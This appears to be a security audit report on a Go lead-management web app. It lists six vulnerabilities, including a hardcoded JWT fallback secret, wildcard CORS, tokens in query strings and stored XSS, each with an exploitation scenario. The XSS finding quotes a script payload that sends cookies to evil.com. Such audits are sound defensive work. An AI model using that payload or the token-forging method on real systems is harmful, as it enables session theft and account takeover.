VULNERABILITY #1
--------------------------------------------------------------------------------
CWE-798 (Use of Hard-Coded Credentials)
Severity: Critical
File: internal/auth/jwt.go, Lines 17-21
Description: The JWT signing secret has a hardcoded fallback value:
  secret = "lead-manager-jwt-secret-change-in-production"
If the JWT_SECRET environment variable is not set (which is the default), this
predictable secret is used to sign and verify all authentication tokens. Any
attacker who reads the source code can forge valid JWT tokens for any user.
Exploitation: An attacker crafts a JWT with an arbitrary user_id and email,
signs it with the known default secret, and gains full authenticated access to
any user's leads. This enables complete account takeover of all users.

VULNERABILITY #2
--------------------------------------------------------------------------------
CWE-319 (Cleartext Transmission of Sensitive Information)
Severity: High
File: cmd/server/main.go, Line 61
Description: The server uses http.ListenAndServe (plain HTTP) with no TLS
configuration. All data, including authentication credentials, JWT tokens, and
lead data (PII such as emails, phone numbers, company names) are transmitted in
cleartext.
Exploitation: An attacker performing a man-in-the-middle attack (e.g., on public
WiFi or a compromised network) can intercept login credentials, JWT tokens, and
all lead data. Captured JWT tokens allow full session hijacking.

VULNERABILITY #3
--------------------------------------------------------------------------------
CWE-942 (Overly Permissive Cross-Origin Resource Sharing)
Severity: High
File: internal/middleware/auth.go, Lines 43-44
Description: The CORS middleware sets Access-Control-Allow-Origin to "*",
allowing any website on the internet to make authenticated cross-origin requests
to the API. Combined with the fact that Authorization headers are also allowed,
any malicious website can make API calls on behalf of a logged-in user if the
token is accessible via JavaScript.
Exploitation: An attacker hosts a malicious webpage that makes AJAX requests to
the Lead Manager API. If a user visits the page while having their JWT token
stored in localStorage, the attacker's JavaScript can read the token and make
authenticated API requests to steal or modify the user's leads.

VULNERABILITY #4
--------------------------------------------------------------------------------
CWE-598 (Use of GET Request Method with Sensitive Query Strings)
Severity: High
File: cmd/server/main.go, Lines 140-146
Description: The tokenOrBearerAuth function accepts JWT tokens via the URL query
parameter "?token=". This causes the JWT authentication token to be logged in
web server access logs, browser history, proxy logs, and HTTP Referer headers.
Exploitation: An attacker can harvest JWT tokens from server access logs, proxy
logs, browser history, or Referer headers sent to third-party resources linked
from export result pages. Each captured token grants full authenticated access.

VULNERABILITY #5
--------------------------------------------------------------------------------
CWE-307 (Improper Restriction of Excessive Authentication Attempts)
Severity: High
File: internal/handlers/auth.go, Lines 88-138
Description: The login endpoint has no rate limiting, account lockout, or
throttling mechanism. An attacker can make unlimited login attempts without any
delay or penalty.
Exploitation: An attacker performs brute-force or credential-stuffing attacks
against user accounts by sending rapid, repeated login requests. The weak
minimum password length (6 characters) makes brute-force attacks even more
feasible.

VULNERABILITY #6
--------------------------------------------------------------------------------
CWE-79 (Cross-Site Scripting - Stored XSS)
Severity: Medium
File: internal/handlers/leads.go, Lines 25-60 (Create), Lines 225-296 (Update),
      internal/handlers/import_export.go, Lines 62-132 (Import)
Description: User-supplied data for lead fields (FullName, Email, Phone,
Company, Position, Source, Status, Notes) and interaction fields is stored in
Firestore without any sanitization or output encoding. If the frontend renders
these values without proper escaping, stored XSS attacks are possible.
Exploitation: An attacker creates or updates a lead with JavaScript in the
FullName or Notes field (e.g., "<script>document.location='http://evil.com/
steal?c='+document.cookie</script>"). When another user views this lead in the
frontend, the malicious script executes in their browser context.
